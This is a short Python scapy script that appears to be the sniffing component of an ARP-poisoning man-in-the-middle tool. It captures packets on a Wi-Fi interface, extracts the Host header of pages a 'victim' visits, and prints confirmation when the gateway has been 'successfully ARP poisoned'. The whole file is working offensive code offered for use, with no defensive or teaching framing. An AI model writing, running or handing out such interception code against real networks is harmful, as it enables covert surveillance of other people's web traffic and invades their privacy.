from scapy.all import *
from sty import fg,rs

#don't edit unless you know what to do <3

iface = "wlan0" #wlan0 by default

def color(text,color):
	return color+text+fg.rs

def sniff_p(pkt):
	ip = get_if_addr(iface)
	print(pkt.summary())
	try:
		if pkt[IP].dst == ip and (pkt[TCP].dport == 80 or pkt[TCP].dport == 443):
			content = raw(pkt).decode(errors="ignore",encoding="utf-8")
			#hexdump(pkt[TCP])
			print(color("{}\n(ARP poison) [i] Victim visited {}".format(content,content.split("Host: ")[1].split("\n")[0]),fg(255,255,0)))
	except:
		pass
	if pkt.haslayer(ARP):
		print(pkt.show())
		print(color("ARP request sent from {} to {}".format(pkt.psrc,pkt.pdst),fg(255,255,0)))
		if pkt.psrc == conf.route.route("0.0.0.0")[2]:
			print(color("Successfully ARP poisoned!",fg(0,255,100)))
while True:
	s = sniff(count=1,iface=iface,prn=sniff_p)
